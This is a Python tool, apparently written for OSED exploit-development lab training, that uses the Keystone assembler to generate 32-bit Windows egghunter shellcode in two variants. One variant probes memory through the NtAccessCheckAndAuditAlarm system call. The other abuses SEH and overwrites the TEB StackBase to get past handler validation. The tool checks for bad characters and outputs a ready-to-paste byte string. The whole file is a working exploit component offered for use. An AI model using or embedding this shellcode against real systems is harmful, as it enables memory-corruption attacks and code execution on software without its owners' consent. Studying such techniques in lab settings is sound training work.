#!/usr/bin/python3
import sys
import argparse
import keystone as ks


def is_valid_tag_count(s):
    return True if len(s) == 4 else False


def tag_to_hex(s):
    string = s
    if is_valid_tag_count(s) == False:
        args.tag = "w00t"
        string = args.tag
    retval = list()
    for char in string:
        retval.append(hex(ord(char)).replace("0x", ""))
    return "0x" + "".join(retval[::-1])

# todo add the NtDisplayString system call https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtDisplayString.html
# > u ntdll!NtDisplayString
# mov   eax, 144h
# call  ntdll!NtDisplayString+0xd   (771fe9d)
# ret   4

def ntaccess_hunter(tag):
    asm = f"""
    loop_inc_page:
        or dx, 0x0fff               # memory page counter; or used because of null bytes
    loop_inc_one:
        inc edx                     # increase the memory counter
    loop_check:
        push edx                    # save edx which holds our memory (edx is volatile)
        xor eax, eax                # clear eax for system call
        add ax, 0x01c6              # NtAccessCheckAndAuditAlarm 
        int 0x2e                    # Perform the system call
        cmp al, 05                  # Check for (access violation), 0xc0000005 
        pop edx                     # restore edx (the current page)
    loop_check_valid:
        je loop_inc_page            # if there was an access violation check the next page
    is_egg:
        mov eax, {tag_to_hex(tag)}  # put the tag we want to search for into eax  
        mov edi, edx                # init pointer with current checked address
        scasd                       # compare eax with doubleword at edi and set statusflag
        jnz loop_inc_one            # if there's no match go to next memory page
    first_half_found:                
        scasd                       # check for the second part of our egg
        jnz loop_inc_one            # if not found we go to the next memory page
    matched_both_halves:            # we have found both halves and the address is in edi
        jmp edi                     # jmp to our offset
    """
    return asm


def seh_hunter(tag):
    asm = [
        "start:",
        "jmp get_seh_address",  # start of jmp/call/pop
        "build_exception_record:",
        "pop ecx",  # address of exception_handle; a pointer to our _except_handler functionr
        f"mov eax, {tag_to_hex(tag)}",  # tag into eax
        "push ecx",  # push Handler of the _EXCEPTION_REGISTRATION_RECORD structure
        "push 0xffffffff",  # push Next of the _EXCEPTION_REGISTRATION_RECORD structure
        "xor ebx, ebx",
        "mov dword ptr fs:[ebx], esp",  # overwrite ExceptionList in the TEB with a pointer to our new _EXCEPTION_REGISTRATION_RECORD structure
        # bypass RtlIsValidHandler's StackBase check by placing the memory address of our _except_handler function at a higher address than the StackBase.
        "sub ecx, 0x04",  # substract 0x04 from the pointer to exception_handler
        "add ebx, 0x04",  # add 0x04 to ebx
        "mov dword ptr fs:[ebx], ecx",  # overwrite the StackBase in the TEB
        "is_egg:",
        "push 0x02",
        "pop ecx",  # load 2 into counter
        "mov edi, ebx",  # move memory page address into edi
        "repe scasd",  # check for tag, if the page is invalid we trigger an exception and jump to our exception_handler function
        "jnz loop_inc_one",  # didn't find signature, increase ebx and repeat
        "jmp edi",  # found the tag
        "loop_inc_page:",
        "or bx, 0xfff",  # if page is invalid the exception_handler will update eip to point here and we move to next page
        "loop_inc_one:",
        "inc ebx",  # increase memory page address by a byte
        "jmp is_egg",  # check for the tag again
        "get_seh_address:",
        "call build_exception_record",  # call portion of jmp/call/pop
        "push 0x0c",
        "pop ecx",  # store 0x0c in ecx to use as an offset
        "mov eax, [esp+ecx]",  # mov into eax the pointer to the CONTEXT structure for our exception
        "mov cl, 0xb8",  # mov 0xb8 into ecx which will act as an offset to the eip
        # increase the value of eip by 0x06 in our CONTEXT so it points to the "or bx, 0xfff" instruction to increase the memory page
        "add dword ptr ds:[eax+ecx], 0x06",
        "pop eax",  # save return address in eax
        "add esp, 0x10",  # increase esp to clean the stack for our call
        "push eax",  # push return value back into the stack
        "xor eax, eax",  # null out eax to simulate ExceptionContinueExecution return
        "ret",
    ]
    return "\n".join(asm)


def main(args):

    egghunter = ntaccess_hunter(args.tag) if not args.seh else seh_hunter(args.tag)

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    if args.seh:
        encoding, count = eng.asm(egghunter)
    else:
        print("[+] Egghunter assembly code + coresponding bytes")
        asm_blocks = ""
        prev_size = 0
        for line in egghunter.splitlines():
            asm_blocks += line + "\n"
            encoding, count = eng.asm(asm_blocks)
            if encoding:
                enc_opcode = ""
                for byte in encoding[prev_size:]:
                    enc_opcode += "0x{0:02x} ".format(byte)
                    prev_size += 1
                spacer = 30 - len(line)
                print("%s %s %s" % (line, (" " * spacer), enc_opcode))

    final = ""
    final += 'egghunter = b"'

    for enc in encoding:
        final += "\\x{0:02x}".format(enc)

    final += '"'

    sentry = False

    for bad in args.bad_chars:
        if bad in final:
            print(f"[!] Found 0x{bad}")
            sentry = True

    if sentry:
        print(f"[=] {final[14:-1]}", file=sys.stderr)
        raise SystemExit("[!] Remove bad characters and try again")

    print(f"[+] egghunter created!")
    print(f"[=]   len: {len(encoding)} bytes")
    print(f"[=]   tag: {args.tag * 2}")
    print(f"[=]   ver: {['NtAccessCheckAndAuditAlarm', 'SEH'][args.seh]}\n")
    print(final)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates an egghunter compatible with the OSED lab VM"
    )

    parser.add_argument(
        "-t",
        "--tag",
        help="tag for which the egghunter will search (default: w00t)",
        default="w00t",
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        help="space separated list of bad chars to check for in final egghunter (default: 00)",
        default=["00"],
        nargs="+",
    )
    parser.add_argument(
        "-s",
        "--seh",
        help="create an seh based egghunter instead of NtAccessCheckAndAuditAlarm",
        action="store_true",
    )

    args = parser.parse_args()

    main(args)
